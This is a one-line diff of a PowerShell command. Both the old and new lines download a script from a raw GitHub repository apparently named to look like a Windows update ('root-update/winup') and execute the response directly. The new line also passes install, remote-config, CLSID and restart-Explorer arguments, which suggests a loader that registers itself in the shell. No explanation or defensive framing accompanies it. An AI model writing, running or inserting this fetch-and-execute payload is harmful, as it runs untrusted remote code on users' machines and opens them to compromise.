@@ -1,1 +1,1 @@
-$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','https://raw.githubusercontent.com/root-update/winup/refs/heads/main/c.txt',$false);$h.Send();& ([scriptblock]::Create($h.ResponseText)) 
+$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','https://raw.githubusercontent.com/root-update/winup/refs/heads/main/n.txt',$false);$h.Send();& ([scriptblock]::Create($h.ResponseText)) -Action Install -Config "https://raw.githubusercontent.com/root-update/winup/refs/heads/main/conf.cfg" -Clsid '{578480AA-1B1C-4343-AABD-62C0A273DCB5}' -RestartExplorer
